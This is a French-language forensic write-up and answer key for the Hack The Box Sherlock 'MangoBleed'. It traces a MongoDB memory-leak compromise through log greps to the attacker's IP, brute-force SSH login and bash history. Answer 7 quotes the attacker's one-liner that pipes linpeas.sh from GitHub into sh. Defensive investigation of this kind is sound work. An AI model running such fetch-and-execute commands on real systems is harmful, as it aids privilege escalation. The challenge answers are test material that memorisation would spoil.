# MangoBleed

**Sherlock :** https://app.hackthebox.com/sherlocks/MangoBleed

**Difficulté :** Very Easy · **Artefacts :** triage UAC du serveur `mongodbsync`

Un serveur MongoDB secondaire est peut-être vulnérable à MongoBleed, une faille qui permet de lire la mémoire du serveur sans être authentifié. On a un triage UAC pour vérifier s'il a été compromis.

## Questions

#### 1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

Une recherche Google sur « MongoBleed » suffit.

**Réponse :** `CVE-2025-14847`

#### 2. What is the version of MongoDB installed on the server that the CVE exploited?

```bash
grep -i buildinfo var/log/mongodb/mongod.log
```

**Réponse :** `8.0.16`

#### 3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

L'exploit fait des milliers de connexions (`id 22943`) et déconnexions (`id 22944`) en très peu de temps. J'ai utilisé le script [mongobleed-detector](https://github.com/Neo23x0/mongobleed-detector), qui sort directement l'IP suspecte.

**Réponse :** `65.0.76.43`

#### 4. Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began (the earliest confirmed malicious event).

Premier log venant de cette IP.

**Réponse :** `2025-12-29 05:25:52`

#### 5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

```bash
grep '65.0.76.43' mongod.log | grep '"id":22943' | wc -l
```

**Réponse :** `75260`

#### 6. The attacker gained remote access after a series of brute‑force attempts. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

```bash
grep '65.0.76.43' var/log/auth.log
```
On voit des échecs sur `mongoadmin`, puis une session ouverte et fermée dans la même seconde (brute-force automatique). La vraie session interactive vient après et dure environ 8 minutes.

**Réponse :** `2025-12-29 05:40:03`

#### 7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

Dans le `.bash_history` de `mongoadmin`.

**Réponse :** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

#### 8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

Toujours dans le `.bash_history`, on voit un `cd` puis le lancement d'un serveur web Python.

**Réponse :** `/var/lib/mongodb`

## Note
- La fuite mémoire a probablement donné à l'attaquant de quoi se connecter en SSH ensuite.
- Sous Linux, je remonte comme ça : IP → `auth.log` → `.bash_history`.
